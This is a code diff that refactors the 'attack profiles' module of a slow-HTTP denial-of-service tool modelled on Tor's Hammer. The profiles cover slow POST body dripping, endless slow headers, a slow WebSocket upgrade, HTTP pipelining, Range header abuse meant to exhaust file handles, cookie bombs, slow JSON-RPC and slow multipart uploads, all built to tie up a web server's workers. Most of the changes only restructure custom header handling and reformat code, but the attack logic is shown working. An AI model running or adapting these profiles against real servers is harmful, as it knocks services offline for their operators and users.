@@ -1,7 +1,7 @@
 """Attack profiles.
 
-Each profile opens one connection and slowly consumes it so that a
-vulnerable web server ties up a worker thread/process waiting on it:
+14 classic + protocol TCP profiles plus the ``udp`` datagram mode (handled by
+``udp.py``/the engine) for 15 total modes:
 
 * ``slow-post``   - send headers with a big Content-Length, then drip the
                     body one byte at a time (classic Tor's Hammer).
@@ -90,11 +90,9 @@ def _base_headers(config: Config, ua: str) -> list[str]:
     if random.random() < 0.4:
         headers.append(f"X-Trace-Id: {secrets.token_hex(6)}")
 
-    # Add custom headers.
-    # custom_headers may be either a dict[str,str] (normal case) or a list[str]
-    # (pre-formatted 'Name: Value' strings for programmatic override).
+    # Add custom headers (dict[str, str]; Host/Connection are structural).
     custom = config.custom_headers
-    if isinstance(custom, dict):
+    if custom:
         # CLI-sourced: Host and Connection are structural and must not be
         # overridden (they would corrupt request framing). Any other header,
         # including User-Agent and Accept, replaces its default line so the
@@ -125,10 +123,6 @@ def _base_headers(config: Config, ua: str) -> list[str]:
             else:
                 rebuilt.append(header)
         headers = rebuilt + extras
-    elif isinstance(custom, list):
-        # Programmatic list: caller takes full responsibility; no filter applied.
-        for header in custom:
-            headers.append(header)
 
     return headers
 
@@ -236,8 +230,8 @@ class SlowHeaders(Profile):
         await _write(writer, req, stats, config)
         # Send custom headers first (if any), then random X-headers
         if config.custom_headers:
-            for header in config.custom_headers:
-                await _write(writer, (header + "\r\n").encode(), stats, config)
+            for name, value in config.custom_headers.items():
+                await _write(writer, f"{name}: {value}\r\n".encode(), stats, config)
                 await _halt(stop, config)
         while not stop.is_set():
             key = f"X-{_rand_hex(6)}"
@@ -312,6 +306,7 @@ class WebSocketSlowUpgrade(Profile):
         headers.append("Connection: Upgrade")
         # Generate WebSocket key (random base64)
         import base64
+
         ws_key = base64.b64encode(secrets.token_bytes(16)).decode()
         headers.append(f"Sec-WebSocket-Key: {ws_key}")
         headers.append("Sec-WebSocket-Version: 13")
@@ -348,9 +343,7 @@ class HttpPipelining(Profile):
         method = config.method or "GET"
         headers = _base_headers(config, ua)
         req = (
-            f"{method} {_path(config)} HTTP/1.1\r\n"
-            + "\r\n".join(headers)
-            + "\r\n\r\n"
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         ).encode()
 
         # Send multiple requests in pipeline
@@ -371,7 +364,9 @@ class RangeHeaderAbuse(Profile):
         # Send many byte range requests to exhaust file handle limits
         method = config.method or "GET"
         request_count = 0
-        while not stop.is_set() and request_count < 100:  # Limit to 100 range requests per connection
+        while (
+            not stop.is_set() and request_count < 100
+        ):  # Limit to 100 range requests per connection
             headers = _base_headers(config, ua)
             # Add random Range header
             start = random.randint(0, 1000000)
@@ -379,9 +374,7 @@ class RangeHeaderAbuse(Profile):
             headers.append(f"Range: bytes={start}-{end}")
 
             req = (
-                f"{method} {_path(config)} HTTP/1.1\r\n"
-                + "\r\n".join(headers)
-                + "\r\n\r\n"
+                f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
             ).encode()
 
             await _write(writer, req, stats, config)
@@ -410,9 +403,7 @@ class CookieBomb(Profile):
         headers.append(f"Cookie: {cookie_name}={cookie_value}")
 
         req = (
-            f"{method} {_path(config)} HTTP/1.1\r\n"
-            + "\r\n".join(headers)
-            + "\r\n\r\n"
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         ).encode()
 
         await _write(writer, req, stats, config)
@@ -442,9 +433,7 @@ class JsonRpcSlow(Profile):
 
         headers.append(f"Content-Length: {json_length + 1000}")  # Claim larger size
         req = (
-            f"{method} {_path(config)} HTTP/1.1\r\n"
-            + "\r\n".join(headers)
-            + "\r\n\r\n"
+            f"{method} {_path(config)} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"
         ).encode()
 
         await _write(writer, req, stats, config)
@@ -452,7 +441,7 @@ class JsonRpcSlow(Profile):
         # Slowly send JSON payload character by character
         sent = 0
         while not stop.is_set() and sent < len(json_payload):
-            await _write(writer, json_payload[sent:sent+1].encode(), stats, config)
+            await _write(writer, json_payload[sent : sent + 1].encode(), stats, config)
             sent += 1
             await _halt(stop, config)
 
@@ -537,9 +526,7 @@ class MultipartSlowUpload(Profile):
         headers = _base_headers(config, ua)
         # `--header Expect:...` must not leak into multipart (it would turn
         # the upload into an expect/continue transaction), mirroring Rust.
-        headers = [
-            h for h in headers if h.split(":", 1)[0].strip().lower() != "expect"
-        ]
+        headers = [h for h in headers if h.split(":", 1)[0].strip().lower() != "expect"]
         headers.append(f"Content-Type: {ctype}")
         headers.append(f"Content-Length: {config.base_post_length}")
         lines = [f"{config.method or 'POST'} {_path(config)} HTTP/1.1"] + headers
